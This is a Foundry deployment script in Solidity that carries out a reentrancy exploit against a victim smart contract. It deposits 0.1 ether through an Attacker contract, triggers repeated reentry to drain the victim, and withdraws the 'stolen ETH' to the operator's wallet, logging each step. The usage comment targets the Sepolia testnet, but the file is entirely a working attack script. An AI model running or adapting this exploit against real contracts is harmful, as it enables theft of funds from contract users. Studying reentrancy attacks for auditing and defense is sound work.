// SPDX-License-Identifier: MIT
pragma solidity ^0.8.27;

import {Script, console} from "forge-std/Script.sol";
import {Attacker} from "../src/Attacker.sol";

/// @notice Execute the full exploit: deposit → reenter → withdraw.
///         Usage:
///           forge script script/Exploit.s.sol --rpc-url sepolia --broadcast \
///             --sig "run(address)" <ATTACKER_ADDRESS>
contract ExploitScript is Script {
    function run(address payable attackerAddr) external {
        uint256 deployerKey = vm.envUint("PRIVATE_KEY");
        Attacker attacker = Attacker(attackerAddr);

        uint256 depositAmount = 0.1 ether;

        console.log("=== Exploit Parameters ===");
        console.log("Attacker:", attackerAddr);
        console.log("Victim:", address(attacker.victim()));
        console.log("Deposit:", depositAmount);
        console.log("Victim balance:", address(attacker.victim()).balance);

        vm.startBroadcast(deployerKey);

        // Step 1: Deposit
        attacker.depositToVictim{value: depositAmount}();
        console.log("[1] Deposited", depositAmount);

        // Step 2: Exploit — reentrancy drains the victim
        attacker.exploit(depositAmount);
        console.log("[2] Exploit complete. Reentries:", attacker.reentryCount());
        console.log("    Attacker balance:", attacker.getBalance());

        // Step 3: Withdraw stolen ETH to EOA
        attacker.withdraw();
        console.log("[3] Withdrawn to owner");

        vm.stopBroadcast();
    }
}
